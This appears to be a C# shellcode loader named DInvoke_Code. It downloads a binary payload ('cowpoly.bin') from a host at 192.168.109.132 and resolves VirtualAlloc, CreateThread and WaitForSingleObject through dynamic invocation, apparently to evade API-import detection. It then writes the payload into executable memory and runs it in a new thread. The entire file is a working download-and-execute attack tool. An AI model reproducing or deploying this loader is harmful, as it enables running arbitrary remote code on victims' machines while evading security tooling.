using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net;

namespace DInvoke_Code
{
    class Program
    {
        static void Main(string[] args)
        {

            //Dinvoke test
            byte[] codepent = new WebClient().DownloadData("http://192.168.109.132:80/cowpoly.bin");

            // Console.WriteLine((uint)codepent.Length);
            // System.Threading.Thread.Sleep(10000);
            IntPtr func_ptr = IntPtr.Zero;
            // IntPtr pHandle = Process.GetCurrentProcess().Handle;
            
            func_ptr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "VirtualAlloc");
            DELEGATES.VirtualAllocRx VirtualAllocRx = Marshal.GetDelegateForFunctionPointer(func_ptr, typeof(DELEGATES.VirtualAllocRx)) as DELEGATES.VirtualAllocRx;
            IntPtr rMemAddress = VirtualAllocRx(0, (uint)codepent.Length, 0x1000 | 0x2000, 0x40);

            Marshal.Copy(codepent, 0, (IntPtr)(rMemAddress), codepent.Length);
            IntPtr hThread = IntPtr.Zero;
            IntPtr pinfo = IntPtr.Zero;
            UInt32 threadId = 0;

            func_ptr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "CreateThread");
            DELEGATES.CreateThreadRx CreateThreadRx = Marshal.GetDelegateForFunctionPointer(func_ptr, typeof(DELEGATES.CreateThreadRx)) as DELEGATES.CreateThreadRx;
            hThread = CreateThreadRx(0, 0, rMemAddress, pinfo, 0, ref threadId);

            func_ptr = DInvokeFunctions.GetLibraryAddress("kernel32.dll", "WaitForSingleObject");
            DELEGATES.WaitForSingleObjectRx WaitForSingleObjectRx = Marshal.GetDelegateForFunctionPointer(func_ptr, typeof(DELEGATES.WaitForSingleObjectRx)) as DELEGATES.WaitForSingleObjectRx;
            WaitForSingleObjectRx(hThread, 0xFFFFFFFF);
        }
    }
}
